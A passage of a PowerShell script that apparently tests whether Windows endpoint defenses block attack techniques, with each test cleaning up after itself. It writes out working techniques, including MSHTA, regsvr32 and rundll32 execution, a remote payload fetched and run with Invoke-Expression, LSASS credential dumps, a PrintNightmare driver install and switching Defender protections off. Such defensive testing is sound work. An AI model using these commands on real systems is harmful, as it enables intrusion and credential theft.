                write-host -foregroundcolor $processmessagecolor "- Re-enabling all downloads and attachments protection"
                Set-MpPreference -DisableIOAVProtection $false
            }
        }
        catch {
            write-host -foregroundcolor $processmessagecolor "failed"
        }        
    }
    else {
        write-host -foregroundcolor red "All downloads and attachments protection is disabled"
    }
    
    if (-not $result.DisableScriptScanning) {
        write-host -foregroundcolor $processmessagecolor "Script Scanning is enabled"
        write-host -foregroundcolor $processmessagecolor -nonewline "- Attempt to disable Script Scanning has "
        try {
            Set-MpPreference -DisableScriptScanning $true -ErrorAction stop
            $rtm = (get-mppreference).DisableScriptScanning
            if (-not $rtm) {
                write-host -foregroundcolor $processmessagecolor "failed"
            }
            else {
                write-host -foregroundcolor $errormessagecolor "SUCCEEDED"
                write-host -foregroundcolor $processmessagecolor "- Re-enabling Script Scanning"
                Set-MpPreference -DisableScriptScanning $false
            }           
        }
        catch {
            write-host -foregroundcolor $processmessagecolor "failed"
        }
    }
    else {
        write-host -foregroundcolor $errormessagecolor "Script Scanning is disabled"
    }
    
    if (-not $result.Disablebehaviormonitoring) {
        write-host -foregroundcolor $processmessagecolor "Behavior Monitoring is enabled"
        write-host -foregroundcolor $processmessagecolor -nonewline "- Attempt to disable Behavior Monitoring has "
        try {
            Set-MpPreference -Disablebehaviormonitoring $true -ErrorAction stop
            $rtm = (get-mppreference).Disablebehaviormonitoring
            if (-not $rtm) {
                write-host -foregroundcolor $processmessagecolor "failed"
            }
            else {
                write-host -foregroundcolor $errormessagecolor "SUCCEEDED"
                write-host -foregroundcolor $processmessagecolor "- Re-enabling Behavior Monitoring"
                Set-MpPreference -Disablebehaviormonitoring $false
            }    
        }
        catch {
            write-host -foregroundcolor $processmessagecolor "failed"
        }
    }
    else {
        write-host -foregroundcolor $errormessagecolor "Behavior Monitoring is disabled"
    }

    if (-not $result.disableblockatfirstseen) {
        write-host -foregroundcolor $processmessagecolor "Block at First Seen is enabled"
        write-host -foregroundcolor $processmessagecolor -nonewline "- Attempt to disable Block at First Seen has "
        try {
            Set-MpPreference -disableblockatfirstseen $true -ErrorAction stop
            $rtm = (get-mppreference).disableblockatfirstseen
            if (-not $rtm) {
                write-host -foregroundcolor $processmessagecolor "failed"
            }
            else {
                write-host -foregroundcolor $errormessagecolor "SUCCEEDED"
                write-host -foregroundcolor $processmessagecolor "- Re-enabling Block at First Seen"
                Set-MpPreference -disableblockatfirstseen $false
            }    
        }
        catch {
            write-host -foregroundcolor $processmessagecolor "failed"
        }
    }
    else {
        write-host -foregroundcolor $errormessagecolor "Block at First Seen is disabled"
    }

    if (-not $result.disableemailscanning) {
        write-host -foregroundcolor $processmessagecolor "Email Scaning is enabled"
        write-host -foregroundcolor $processmessagecolor -nonewline "- Attempt to disable Email Scanning has "
        try {
            Set-MpPreference -disableemailscanning $true -ErrorAction stop
            $rtm = (get-mppreference).disableemailscanning 
            if (-not $rtm) {
                write-host -foregroundcolor $processmessagecolor "failed"
            }
            else {
                write-host -foregroundcolor $errormessagecolor "SUCCEEDED"
                write-host -foregroundcolor $processmessagecolor "- Re-enabling Email Scanning"
                Set-MpPreference -disableemailscanning $false
            }
        }
        catch {
            write-host -foregroundcolor $processmessagecolor "failed"
        }
    }
    else {
        write-host -foregroundcolor $errormessagecolor "Email Scanning is disabled"
    }

    switch ($result.EnableControlledFolderAccess) {
        0 { write-host -foregroundcolor $errormessagecolor "Controlled Folder Access is disabled"; break}
        1 { write-host -foregroundcolor $processmessagecolor  "Controlled Folder Access will block "; break}
        2 { write-host -foregroundcolor $warningmessagecolor  "Controlled Folder Access will audit "; break}
        3 { write-host -foregroundcolor $warningmessagecolor  "Controlled Folder Access will block disk modifications only "; break}
        4 { write-host -foregroundcolor $warningmessagecolor  "Controlled Folder Access will audit disk modifications "; break}
        default { write-host -foregroundcolor $warningmessagecolor  "Controlled Folder Access status unknown"}
    }
    
    switch ($result.EnableNetworkProtection) {
        0 { write-host -foregroundcolor $errormessagecolor "Network protection is disabled"; break}
        1 { write-host -foregroundcolor $processmessagecolor  "Network Protection is enabled (block mode) "; break}
        2 { write-host -foregroundcolor $warningmessagecolor  "Network Protection is enabled (audit mode) "; break}
        default { write-host -foregroundcolor $warningmessagecolor  "Controlled Folder Access status unknown"}
    }
    
    switch ($result.MAPSReporting) {
        0 { write-host -foregroundcolor $errormessagecolor "Microsoft Active Protection Service (MAPS) Reporting is disabled"; break}
        1 { write-host -foregroundcolor $warningmessagecolor  "Microsoft Active Protection Service (MAPS) Reporting is set to basic"; break}
        2 { write-host -foregroundcolor $processmessagecolor  "Microsoft Active Protection Service (MAPS) Reporting is set to advanced"; break}
        default { write-host -foregroundcolor $warningmessagecolor  "Controlled Folder Access status unknown"}
    }
    
    switch ($result.SubmitSamplesConsent) {
        0 { write-host -foregroundcolor $errormessagecolor "Submit Sample Consent is set to always prompt"; break}
        1 { write-host -foregroundcolor $warningmessagecolor  "Submit Sample Consent is set to send safe samples automatically"; break}
        2 { write-host -foregroundcolor $errormessagecolor  "Submit Sample Consent is set to never send "; break}
        3 { write-host -foregroundcolor $processmessagecolor  "Submit Sample Consent is set to send all samples automatically "; break}
        default { write-host -foregroundcolor $warningmessagecolor  "Controlled Folder Access status unknown"}
    } 
}

function mshta() {
    
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 25. Block MSHTA process launching ---"

$body = @"
"about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""notepad.exe"""))</script>'"
"@

    try {
        $error.Clear()      # Clear any existing errors
        start-process -filepath "mshta.exe" -argumentlist $body -ErrorAction Continue
    }
    catch {
        write-host -foregroundcolor $processmessagecolor "Execution error detected:"
        write-host "    ",($error[0].exception)
    }
    write-host -foregroundcolor $warningmessagecolor "`nIf NOTEPAD has executed, then the test has FAILED`n"
    pause
}

function squiblydoo() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 26. Squiblydoo attack ---"
    write-host -foregroundcolor $processmessagecolor "Create SC.SCT file in current directory"
$body1 = @"
<?XML version="1.0"?>
<scriptlet>
<registration progid="TESTING" classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
<script language="JScript">
"@
$body2 = @"
<![CDATA[
var foo = new ActiveXObject("WScript.Shell").Run("notepad.exe");]]>
</script>
</registration>
</scriptlet>
"@
    
    $body = -join($body1,$body2)
    set-content -Path .\sc.sct $body
    write-host -foregroundcolor $processmessagecolor "Execute regsvr32.exe in current directory"
    start-process -filepath "regsvr32.exe" -argumentlist "/s /n /u /i:sc.sct scrobj.dll"
    write-host -foregroundcolor $warningmessagecolor "If NOTEPAD is executed, then the test has FAILED`n"
    pause
    write-host -foregroundcolor $processmessagecolor "Delete SC.SCT"
    remove-item .\sc.sct  
}

function certutil() {
    
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 27. Block Certutil download ---"
    write-host -foregroundcolor $processmessagecolor "Use CERTUTIL.EXE to download puty.exe in current directory"
    $opt = "-urlcache -split -f https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe putty.exe"
    try {
        start-process "certutil.exe" -ArgumentList $opt -ErrorAction continue| Out-Null
    }
    catch {}
    write-host -foregroundcolor $processmessagecolor "Check for PUTTY.EXE in current directory"
    $result = test-path ".\putty.exe"
    if ($result) {
        write-host -foregroundcolor $errormessagecolor "PUTTY.EXE found - test FAILED`n"
        write-host -foregroundcolor $processmessagecolor "Delete PUTTY.EXE"
        remove-item .\putty.exe
    }
    else {
        write-host -foregroundcolor $processmessagecolor "PUTTY.EXE not found - test SUCCEEDED`n"
    }     
}

function wmic() {
    
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 28. Block WMIC process launch ---"

    $opt = "process call create notepad"
    try {
        start-process -filepath "wmic.exe" -argumentlist $opt -ErrorAction Continue
    }
    catch {
    }
    write-host -foregroundcolor $warningmessagecolor "`nIf NOTEPAD has executed, then the test has FAILED`n"
    pause
}

function rundll() {
    
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 29. Block RUNDLL32 process launch ---"

$body = @"
javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"notepad\");window.close()");
"@
    try {
        start-process -filepath "rundll32" -argumentlist $body -ErrorAction Continue
    }
    catch {
    }
    write-host -foregroundcolor $warningmessagecolor "`nIf NOTEPAD has executed, then the test has FAILED`n"
    pause
}

function mimispool () {
    # Reference - https://github.com/gentilkiwi/mimikatz/tree/master/mimispool#readme
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 30. PrintNightmare / Mimispool ---"

    $install = $true
    $serverName  = 'printnightmare.gentilkiwi.com'
    $username    = 'gentilguest'
    $password    = 'password'
    $printerName = 'Kiwi Legit Printer'
    $system32        = $env:systemroot + '\system32'
    $drivers         = $system32 + '\spool\drivers'

    $fullprinterName = '\\' + $serverName + '\' + $printerName
    $credential = (New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString -AsPlainText -String $password -Force)))
    write-host -foregroundcolor $warningmessagecolor "*** WARNING - This process will install a test printer driver and associated files"
    write-host -foregroundcolor $processmessagecolor "Removing existing test printer if present"
    Remove-PSDrive -Force -Name 'KiwiLegitPrintServer' -ErrorAction SilentlyContinue
    Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
    write-host -foregroundcolor $processmessagecolor "Creating new",$printerName
    New-PSDrive -Name 'KiwiLegitPrintServer' -Root ('\\' + $serverName + '\print$') -PSProvider FileSystem -Credential $credential | Out-Null
    try {
        Add-Printer -ConnectionName $fullprinterName -ErrorAction stop
    } 
    catch {
        write-host -foregroundcolor $processmessagecolor "Unable to install printer - test SUCCESSFUL"
        $install=$false
        Remove-PSDrive -Force -Name 'KiwiLegitPrintServer' -ErrorAction SilentlyContinue
    }
    write-host -foregroundcolor $warningmessagecolor "`nIf an administrator command prompt appears, then the test has FAILED`n"
    pause

    if ($install) {
        write-host -foregroundcolor $errormessagecolor "`nAble in install printer - test FAILED"
        $driver = (Get-Printer -Name $fullprinterName).DriverName
        write-host -foregroundcolor $processmessagecolor "Remove printer",$printerName
        Remove-Printer -Name $fullprinterName
        start-sleep -Seconds 3
        write-host -foregroundcolor $processmessagecolor "Remove printer driver",$driver
        Remove-PrinterDriver -Name $driver
        write-host -foregroundcolor $processmessagecolor "Remove mapping`n"
        Remove-PSDrive -Force -Name 'KiwiLegitPrintServer'
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        If ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            write-host -foregroundcolor $processmessagecolor "Running as an Administrator detected`n"
            if (test-path($drivers  + '\x64\3\mimispool.dll')) {
                write-host -foregroundcolor $processmessagecolor "Deleting ",($drivers  + '\x64\3\mimispool.dll')
                Remove-Item -Force -Path ($drivers  + '\x64\3\mimispool.dll')
            }
            if (test-path($drivers  + '\W32X86\3\mimispool.dll')) {
                write-host -foregroundcolor $processmessagecolor "Deleting ",($drivers  + '\W32X86\3\mimispool.dll')
                Remove-Item -Force -Path ($drivers  + '\W32X86\3\mimispool.dll')
            }
            if (test-path($system32 + '\mimispool.dll')) {
                write-host -foregroundcolor $processmessagecolor "Deleting ",($system32 + '\mimispool.dll')
                Remove-Item -Force -Path ($system32 + '\mimispool.dll')
            }
        }
        else {
            write-host -foregroundcolor $warningmessagecolor "Not Running as an Administrator. Manual clean up required`n"
            if (test-path($drivers  + '\x64\3\mimispool.dll')) {
                write-host -foregroundcolor $errormessagecolor "***",($drivers  + '\x64\3\mimispool.dll')"Should be removed by an administrator"
            }
            if (test-path($drivers  + '\W32X86\3\mimispool.dll')) {
                write-host -foregroundcolor $errormessagecolor "***",($drivers  + '\W32X86\3\mimispool.dll')"Should be removed by an administrator"
            }
            if (test-path($system32 + '\mimispool.dll')) {
                write-host -foregroundcolor $errormessagecolor "***",($system32 + '\mimispool.dll')"Should be removed by an administrator"
            }
        }
    }
}

function hivevul () {
    # Reference - https://github.com/JoranSlingerland/CVE-2021-36934/blob/main/CVE-2021-36934.ps1
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 31. HiveNightmare / CVE-2021-36934 ---"
    $samaccess = $true
    $systemaccess = $true
    $securityaccess = $true
    $systempath = $env:windir
    $LocalUsersGroup = Get-LocalGroup -SID 'S-1-5-32-545'
    try {
        $tryaccess = test-path($systempath+"\system32\config\sam") -ErrorAction stop
    }
    catch {
        $samaccess = $false
    }
    if ($samaccess) {
        write-host -foregroundcolor $processmessagecolor -nonewline "SAM Path exists - "
        $checkPermissions = Get-Acl $env:windir\System32\Config\sam
        if ($LocalUsersGroup) {
            if ($CheckPermissions.Access.IdentityReference -match $LocalUsersGroup.Name) {
                write-host -foregroundcolor $errormessagecolor "SAM Path vulnerable"
            }
            else {
                write-host -foregroundcolor $processmessagecolor "SAM Path not vulnerable"
            }
        }
    }
    else {
        write-host -foregroundcolor $warningmessagecolor "SYSTEM Path does not exists or cannot be accessed"
    }
    try {
        $tryaccess = test-path($systempath+"\system32\config\system") -ErrorAction stop
    }
    catch {
        $systemaccess = $false
    }
    if ($systemaccess) {
        write-host -foregroundcolor $processmessagecolor -nonewline "SYSTEM Path exists - "
        $checkPermissions = Get-Acl $env:windir\System32\Config\system
        if ($LocalUsersGroup) {
            if ($CheckPermissions.Access.IdentityReference -match $LocalUsersGroup.Name) {
                write-host -foregroundcolor $errormessagecolor "SYSTEM Path vulnerable"
            }
            else {
                write-host -foregroundcolor $processmessagecolor "SYSTEM Path not vulnerable"
            }
        }
    }
    else {
        write-host -foregroundcolor $warningmessagecolor "SYSTEM Path does not exists or cannot be accessed"
    }
    try {
        $tryaccess = test-path($systempath+"\system32\config\security") -ErrorAction stop
    }
    catch {
        $securityaccess = $false
    }
    if ($securityaccess) {
        write-host -foregroundcolor $processmessagecolor -nonewline "SECURITY Path exists - "
        $checkPermissions = Get-Acl $env:windir\System32\Config\security
        if ($LocalUsersGroup) {
            if ($CheckPermissions.Access.IdentityReference -match $LocalUsersGroup.Name) {
                write-host -foregroundcolor $errormessagecolor "SECURITY Path vulnerable"
            }
            else {
                write-host -foregroundcolor $processmessagecolor "SECURITY Path not vulnerable"
            }
        }
    }
    else {
        write-host -foregroundcolor $warningmessagecolor "SECURITY Path does not exists or cannot be accessed"
    }
}

function mshtmlvul() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 32. MSHTML remote code execution ---"
    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/WebBrowser.docx -OutFile .\webbrowser.docx
    write-host -foregroundcolor $processmessagecolor "Open document using Word"
    Start-Process winword.exe -ArgumentList ".\webbrowser.docx"
    write-host "`n1. Click on the Totally Safe.txt embedded item at top of document"
    write-host "2. Ensure that CALC.exe cannot be run in any way" 
    write-host "3. Close Word once complete.`n"
    pause
    write-host -foregroundcolor $processmessagecolor "`nDelete webbrowser.docx"
    remove-item .\webbrowser.docx  
}

function formshtml() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 33. Forms HTML controls remote code execution ---"
    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/Forms.HTML.docx -OutFile .\RS4_WinATP-Intro-Invoice.docm
    write-host -foregroundcolor $processmessagecolor "Open document using Word"
    Start-Process winword.exe -ArgumentList ".\forms.html.docx"
    write-host "`n1. Click on the embedded item at top of document"
    write-host "2. Ensure that CALC.exe cannot be run in any way" 
    write-host "3. Close Word once complete.`n"
    pause
    write-host -foregroundcolor $processmessagecolor "`nDelete forms.html.docx"
    remove-item .\forms.html.docx  
}

function backdoordrop() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 34. Document drops backdoor ---"
    write-host -foregroundcolor $processmessagecolor "Download test Word document (RS4_WinATP-Intro-Invoice.docm) to current directory"
    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/RS4_WinATP-Intro-Invoice.docm -OutFile .\RS4_WinATP-Intro-Invoice.docm
    write-host -foregroundcolor $processmessagecolor "Open document RS4_WinATP-Intro-Invoice.docm using Word"
    Start-Process winword.exe -ArgumentList ".\RS4_WinATP-Intro-Invoice.docm"
    write-host "`n1. Use the password = WDATP!diy# to open document"
    write-host "2. Click enable editing if displayed" 
    write-host "3. Click enable content if displayed"
    write-host "4. Click the OK button on dialog if appears`n"
    pause
    try {
        $result = test-path($env:USERPROFILE+"\desktop\WinATP-Intro-Backdoor.exe") -ErrorAction stop
    }
    catch {
        $result = $false
    }
    if ($result) {
        write-host -foregroundcolor $errormessagecolor "`nWinATP-Intro-Backdoor.exe - test FAILED`n"
        write-host -foregroundcolor $processmessagecolor "Delete WinATP-Intro-Backdoor.exe`n"
        remove-item ($env:USERPROFILE+"\desktop\WinATP-Intro-Backdoor.exe")
    }
    else {
        write-host -foregroundcolor $processmessagecolor "`nWinATP-Intro-Backdoor.exe not found - test SUCCEEDED`n"
    } 
    write-host "5. Close Word once complete.`n"
    pause
    write-host -foregroundcolor $processmessagecolor "`nDelete RS4_WinATP-Intro-Invoice.docm`n"
    remove-item .\RS4_WinATP-Intro-Invoice.docm  
}

function psfileless() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 35. PowerShell script in fileless attack ---"
    write-host -foregroundcolor $processmessagecolor "Execute Fileless attack"
$body1 = @'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };
'@
$body2 = @'
Invok
'@
$body3 = @'
e-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
'@

    $body = -join($body1,$body2,$body3)
    $errorfile =".\errorfile.txt"
    Start-Process powershell -ArgumentList $body -wait -WindowStyle Hidden -redirectstandarderror $errorfile
    write-host -foregroundcolor $warningmessagecolor "`nIf NOTEPAD is executed, then the test has FAILED`n"
    pause
}

function sqldumper() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 36. SQLDumper ---"
    write-host -foregroundcolor $processmessagecolor "Download SQLDumper to current directory"
    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/SQLDumper.exe -OutFile .\SQLDumper.exe
    write-host -foregroundcolor $processmessagecolor "Get LSASS.EXE process id"
    $id=(get-process -processname "lsass").Id
    write-host -foregroundcolor $processmessagecolor "Attempt process dump"
    $result = .\sqldumper.exe $id 0 0x01100:40
    if (($result -match "failed") -or [string]::isnullorempty($result)) {
        write-host -foregroundcolor $processmessagecolor "`nProcess dump failed - test SUCCEEDED`n"
        write-host -foregroundcolor $processmessagecolor "Delete SQLDumper.exe`n"
        remove-item .\SQLDumper.exe
    }
    else {
        write-host -foregroundcolor $errormessagecolor "`nProcess dump succeeded - test FAILED`n"
        write-host -foregroundcolor $processmessagecolor "Delete SQLDumper.exe`n"
        remove-item .\SQLDumper.exe
        write-host -foregroundcolor $processmessagecolor "Delete dump file`n"
        remove-item .\SQLD*.*
    }
}

function comsvcs() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 37. Block RUNDLL32 COMSVCS dump process launch ---"
    
$body = @"
rundll.exe %windir%\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) .\lsass.dmp full
"@
    try {
        $errorfile = ".\errorfile.txt"
        Start-Process powershell -ArgumentList $body -wait -WindowStyle Hidden -redirectstandarderror $errorfile
    }
    catch {
        write-host -ForegroundColor $processmessagecolor "Dump process execution failed`n"
    }
    if (test-path('.\lsass.dmp')) {
        write-host -ForegroundColor $errormessagecolor "Test failed - dump created"
        write-host -foregroundcolor $processmessagecolor "  Deleting lsass.dmp`n"
        Remove-Item -Force -Path ('.\lsass.dmp')
    } else {
        write-host -ForegroundColor $processmessagecolor "Test succeeded - dump not created`n"
    }
    pause
}

function notepadmask () {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 38. Mask PowerShell.exe ---"
    write-host -ForegroundColor $processmessagecolor "Copy Powershell.exe to Notepad.exe in current directory`n"
    if (test-path("$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe")) {
        copy-item -path "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe" -destination ".\notepad.exe" -force
        .\notepad.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
        write-host -ForegroundColor $warningmessagecolor "`nNo welcome message should have been displayed`n"
        Pause
        write-host -ForegroundColor $processmessagecolor "Remove notepad.exe from current directory`n"
        remove-item (".\notepad.exe")
    } else {
        write-host -ForegroundColor $errormessagecolor "Unable to locate $env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe`n"
    }

}

function schtsk () {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 39. Create Scheduled Task ---"
    $testflag = $false
    $result = cmd.exe /c 'schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR "cmd /c date /T > .\current_date.txt'
    if ($result -match "SUCCESS") {
        write-host -ForegroundColor $errormessagecolor "Scheduled task created"
        $testflag = $true
        $result = cmd.exe /c 'schtasks /Query /TN CMDTestTask'
        if ($result -match "Ready") {
            write-host -ForegroundColor $errormessagecolor "Scheduled task found"
            $testflag = $true
        }
    }
    if ($testflag) {
        write-host -ForegroundColor $errormessagecolor "Test failed - Scheduled task created"
        write-host -ForegroundColor $processmessagecolor "  Remove scheduled task"
        $result = cmd.exe /c 'schtasks /Delete /TN CMDTestTask /F'
    }
    else {
        write-host -ForegroundColor $errormessagecolor "Test succeeded - No Scheduled task created"
    }
    if (test-path -Path ".\current_date.txt") {
        write-host -ForegroundColor $processmessagecolor "  Remove current_date.txt"
        remove-item -Path ".\current_date.txt"
    }
}

<#          Main                #>
Clear-Host
if ($debug) {       # If -debug command line option specified record log file in parent
    write-host -foregroundcolor $processmessagecolor "Create log file ..\sec-test.txt`n"
    Start-transcript "..\sec-test.txt" | Out-Null                                   ## Log file created in current directory that is overwritten on each run
}
write-host -foregroundcolor $systemmessagecolor "Security test script started`n"
if (-not $debug) {
    Write-host -foregroundcolor $warningmessagecolor "    * use the -debug parameter on the command line to create an execution log file for this script"
}
if (-not $noprompt) {
    write-host -foregroundcolor $warningmessagecolor  "    * use the -noprompt parameter on the command line to run all options with no prompts"
}

$menuitems = @()
write-host -foregroundcolor $processmessagecolor "`nGenerate test options"
$menu = displaymenu($menuitems)                             # generate menu to display
write-host -foregroundcolor $processmessagecolor "Test options generated"

if (-not $noprompt) {
    try {
        $results = $menu | Sort-Object number | Out-GridView -PassThru -title "Select tests to run (Multiple selections permitted - use CTRL + Select) "
    }
    catch {
        write-host -ForegroundColor yellow -backgroundcolor $errormessagecolor "`n[001] - Error getting options`n"
        if ($debug) {
            Stop-Transcript | Out-Null      ## Terminate transcription
        }
        exit 1                              ## Terminate script
    }
}
else {
    write-host -foregroundcolor $processmessagecolor "`nRun all options"
    $results = $menu
}

switch ($results.number) {
    1  {downloadfile}
    2  {createfile}
    3  {inmemorytest}
    4  {processdump}
    5  {mimikatztest}
    6  {failedlogin}
    7  {officechildprocess}
    8  {officecreateexecutable}
    9  {scriptlaunch}
    10  {officemacroimport}
    11  {psexecwmicreation}
    12  {scriptdlexecute}
    13  {networkprotection}
    14  {suspiciouspage}
    15  {phishpage}
    16  {downloadblock}
    17  {exploitblock}
    18  {maliciousframe}
    19  {unknownprogram}
    20  {knownmalicious}
    21  {pua}
    22  {blockatfirst}
    23  {servicescheck}  
    24  {defenderstatus}
    25  {mshta}
    26  {squiblydoo}
    27  {certutil}
    28  {wmic}
    29  {rundll}
    30  {mimispool}
    31  {hivevul}
    32  {mshtmlvul}
    33  {formshtml}
    34  {backdoordrop}
    35  {psfileless}
    36  {sqldumper}
    37  {comsvcs}
    38  {notepadmask}
    39  {schtsk}
}

write-host -foregroundcolor $systemmessagecolor "`nSecurity test script completed"
if ($debug) {
    Stop-Transcript | Out-Null
}